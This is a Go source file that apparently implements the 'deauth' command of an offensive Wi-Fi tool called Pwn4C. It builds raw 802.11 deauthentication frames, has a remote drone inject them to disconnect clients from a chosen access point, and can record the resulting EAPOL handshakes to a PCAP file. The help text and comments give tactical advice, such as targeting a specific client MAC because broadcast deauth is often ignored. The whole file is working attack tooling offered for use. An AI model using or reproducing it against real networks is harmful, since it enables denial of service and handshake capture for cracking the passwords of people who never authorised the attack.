package cmd

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
)

var (
	deauthBSSID       string
	deauthClient      string
	deauthCount       int
	deauthInterval    int
	deauthChannel     int
	deauthTarget      string
	deauthMonitor     bool
	deauthOut         string
	deauthAllClients  bool
	deauthFilterBSSID string
	deauthMgmtOnly    bool
)

var deauthCmd = &cobra.Command{
	Use:   "deauth [target_drone_ip]",
	Short: "Inject IEEE 802.11 Deauthentication frames to disconnect Wi-Fi clients",
	Long: `Generates raw 802.11 management deauthentication frames and commands the drone
to inject them over the air.

Use --monitor to keep the session alive after the burst and stream the
aftermath (probe requests, re-associations, EAPOL handshakes) straight into a
PCAP file — the classic deauth-and-listen workflow in a single command:
  pwn4c deauth -b AA:BB:CC:DD:EE:FF -c 12:22:33:44:55:66 -i 6 --monitor -o handshake.pcap

Broadcast deauth frames are ignored by most clients, so --monitor refuses the
broadcast default and requires the client MAC (-c). Pass --all-clients only if
you deliberately want a broadcast burst.`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := deauthTarget
		if len(args) > 0 {
			target = args[0]
		}

		if target == "" {
			fmt.Println("[*] Searching for active Pwn4C drone...")
			drones, err := drone.Discover(2*time.Second, "")
			if err != nil || len(drones) == 0 {
				fmt.Println("[!] No drone discovered. Please specify drone IP directly.")
				os.Exit(1)
			}
			target = drones[0].IP
			fmt.Printf("[+] Discovered drone at %s\n", target)
		}

		if deauthBSSID == "" {
			fmt.Println("[!] Error: Target AP BSSID is required (--bssid / -b).")
			os.Exit(1)
		}

		// Broadcast deauth is the single most common reason a handshake capture
		// comes back empty: clients are allowed to ignore group-addressed
		// deauth frames, so they stay associated and never re-handshake.
		if deauthMonitor && isBroadcastMAC(deauthClient) && !deauthAllClients {
			fmt.Println("[!] Refusing a broadcast deauth with --monitor.")
			fmt.Println("    Most clients ignore broadcast deauth frames, so the capture")
			fmt.Println("    would look valid but contain no handshake.")
			fmt.Println("    Pass the associated client MAC with -c <MAC>, or add")
			fmt.Println("    --all-clients if you really want a broadcast burst.")
			os.Exit(1)
		}

		if !isBroadcastMAC(deauthClient) && isGroupMAC(deauthClient) {
			fmt.Println("[!] Client MAC is a group/multicast address; deauth needs a")
			fmt.Println("    unicast client MAC (e.g. 12:22:33:44:55:66).")
			os.Exit(1)
		}

		if !deauthMonitor && (deauthFilterBSSID != "" || deauthMgmtOnly) {
			fmt.Println("[!] --filter-bssid / --mgmt-only only apply to --monitor captures.")
			os.Exit(1)
		}

		if deauthFilterBSSID != "" {
			hw, err := net.ParseMAC(deauthFilterBSSID)
			if err != nil || len(hw) != 6 {
				fmt.Printf("[!] Invalid --filter-bssid MAC %q (need 6 octets)\n", deauthFilterBSSID)
				os.Exit(1)
			}
		}

		if deauthMonitor && deauthMgmtOnly {
			fmt.Println("[!] Warning: --mgmt-only drops EAPOL data frames, so the")
			fmt.Println("    4-way handshake will not be in the capture. Use")
			fmt.Println("    --filter-bssid instead when the goal is a handshake.")
		}

		// 1. Build the Deauth packet
		frameHex, err := drone.BuildDeauthFrame(deauthBSSID, deauthClient, drone.ReasonClass3FromNonAssocSTA)
		if err != nil {
			fmt.Printf("[!] Failed to build 802.11 deauth frame: %v\n", err)
			os.Exit(1)
		}

		// 2. Connect to Drone TCP Control
		fmt.Printf("[+] Connecting to drone at %s:%d...\n", target, drone.DefaultControlPort)
		client, err := drone.ConnectControl(target, 5*time.Second)
		if err != nil {
			fmt.Printf("[!] Failed to connect: %v\n", err)
			os.Exit(1)
		}
		defer client.Close()

		// 3. Ensure Monitor mode is active on the correct channel
		status, err := client.GetStatus()
		if err != nil {
			fmt.Printf("[!] Failed to query drone status: %v\n", err)
			os.Exit(1)
		}

		weStartedMonitor := false
		if !status.MonitorActive {
			fmt.Printf("[+] Activating monitor mode on channel %d...\n", deauthChannel)
			if err := client.StartMonitor(deauthChannel); err != nil {
				fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
				os.Exit(1)
			}
			weStartedMonitor = true
		} else if status.Channel != deauthChannel {
			fmt.Printf("[+] Switching channel from %d to %d...\n", status.Channel, deauthChannel)
			if err := client.SetChannel(deauthChannel); err != nil {
				fmt.Printf("[!] Failed to switch channel: %v\n", err)
				os.Exit(1)
			}
		}

		if deauthMonitor {
			runDeauthWithListen(client, frameHex)
			return
		}

		// 4. Plain burst: inject, then leave the radio exactly how we found it
		runPlainDeauth(client, frameHex, weStartedMonitor)
	},
}

// runPlainDeauth injects the burst, waits for the drone's paced TX queue to
// drain so every frame actually leaves the air, then stops monitor mode
// explicitly before the control session closes. Closing the session while
// frames are still queued is what used to knock the drone over.
func runPlainDeauth(client *drone.ControlClient, frameHex string, weStartedMonitor bool) {
	destLabel := clientLabel(deauthClient)

	fmt.Printf("[+] Injecting %d deauth frames (Interval: %dms)...\n", deauthCount, deauthInterval)
	fmt.Printf("    AP (BSSID) : %s\n", deauthBSSID)
	fmt.Printf("    Client     : %s\n", destLabel)
	fmt.Printf("    Channel    : %d\n", deauthChannel)
	if isBroadcastMAC(deauthClient) {
		fmt.Println("    Note       : most clients ignore broadcast deauth; -c <MAC> targets one client.")
	}

	txBefore, txBeforeOK := readInjectFrames(client)
	sent, queued, failed, err := client.SendInjection(frameHex, deauthCount, deauthInterval)
	if err != nil {
		fmt.Printf("[!] Injection failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, failed: %d)\n",
		queued, sent, failed)

	if queued > 0 {
		fmt.Println("[*] Waiting for the drone TX queue to drain...")
		if err := waitForTxDrain(client, 5*time.Second); err != nil {
			fmt.Printf("[!] Lost contact with the drone during TX: %v\n", err)
			fmt.Println("    The drone may have reset — run `pwn4c discover` and check its uptime.")
			return
		}
	}

	reportTxDelta(client, txBefore, txBeforeOK, sent+queued)

	if weStartedMonitor {
		if err := client.StopMonitor(); err != nil {
			fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
		}
	}
}

// isBroadcastMAC reports whether the address is the group-addressed broadcast
// MAC. An empty string is treated as broadcast because that is what
// BuildDeauthFrame substitutes.
func isBroadcastMAC(mac string) bool {
	if mac == "" {
		return true
	}
	hw, err := net.ParseMAC(mac)
	if err != nil || len(hw) != 6 {
		return false
	}
	for _, b := range hw {
		if b != 0xff {
			return false
		}
	}
	return true
}

func clientLabel(mac string) string {
	if isBroadcastMAC(mac) {
		return "Broadcast (All Clients)"
	}
	return mac
}

// isGroupMAC reports whether the address has the I/G bit set (multicast or
// broadcast). Such an address is never a valid single-client deauth target.
func isGroupMAC(mac string) bool {
	hw, err := net.ParseMAC(mac)
	if err != nil || len(hw) != 6 {
		return false
	}
	return hw[0]&0x01 != 0
}

// readInjectFrames samples the drone's cumulative injected-frame counter. The
// boolean is false when telemetry is unavailable or the firmware predates the
// counter, so callers can fall back to a neutral message.
func readInjectFrames(client *drone.ControlClient) (uint64, bool) {
	st, err := client.GetStatus()
	if err != nil || st.InjectFrames == nil {
		return 0, false
	}
	return *st.InjectFrames, true
}

// reportTxDelta compares the injected-frame counter before the burst with the
// counter after the queue drained. The counter tracks frames the driver
// accepted; driver-level retransmissions happen below it and can put more
// frames on air than this delta reports.
func reportTxDelta(client *drone.ControlClient, before uint64, beforeOK bool, expected int) {
	after, afterOK := readInjectFrames(client)
	if !beforeOK || !afterOK || after < before {
		fmt.Printf("[+] Burst complete — %d frame(s) handed to the radio.\n", expected)
		return
	}
	fmt.Printf("[+] TX frames accepted by the driver: +%d (queued %d)\n", after-before, expected)
}

// waitForTxDrain polls drone telemetry until the injection queue is empty (or
// the deadline passes). It keeps the session open for exactly as long as the
// radio still needs it. A transport error means the drone went away mid-burst,
// which the caller must surface instead of reporting a clean send.
func waitForTxDrain(client *drone.ControlClient, maxWait time.Duration) error {
	deadline := time.Now().Add(maxWait)
	for {
		st, err := client.GetStatus()
		if err != nil {
			return err
		}
		if st.TxQueueDepth == 0 {
			return nil
		}
		if time.Now().After(deadline) {
			return nil
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func init() {
	deauthCmd.Flags().StringVarP(&deauthBSSID, "bssid", "b", "", "Target Access Point BSSID (e.g. AA:BB:CC:DD:EE:FF)")
	deauthCmd.Flags().StringVarP(&deauthClient, "client", "c", "ff:ff:ff:ff:ff:ff", "Target Client MAC address (required with --monitor)")
	deauthCmd.Flags().IntVarP(&deauthChannel, "channel", "i", 1, "Wi-Fi channel of the target AP (1-13)")
	deauthCmd.Flags().IntVarP(&deauthCount, "count", "n", 10, "Number of deauth frames to transmit")
	deauthCmd.Flags().IntVar(&deauthInterval, "interval", 10, "Interval between transmissions in milliseconds")
	deauthCmd.Flags().StringVarP(&deauthTarget, "target", "t", "", "Drone IP address")
	deauthCmd.Flags().BoolVar(&deauthMonitor, "monitor", false, "Keep listening after the burst and write the aftermath to a PCAP (handshake capture)")
	deauthCmd.Flags().StringVarP(&deauthOut, "out", "o", "", "PCAP output file for --monitor (default: handshake.pcap)")
	deauthCmd.Flags().BoolVar(&deauthAllClients, "all-clients", false, "Allow a broadcast deauth with --monitor (clients usually ignore it)")
	deauthCmd.Flags().StringVar(&deauthFilterBSSID, "filter-bssid", "", "Kernel BPF filter: capture only frames for this BSSID (with --monitor)")
	deauthCmd.Flags().BoolVar(&deauthMgmtOnly, "mgmt-only", false, "Kernel BPF filter: management frames only (with --monitor)")
	_ = deauthCmd.MarkFlagRequired("bssid")

	rootCmd.AddCommand(deauthCmd)
}
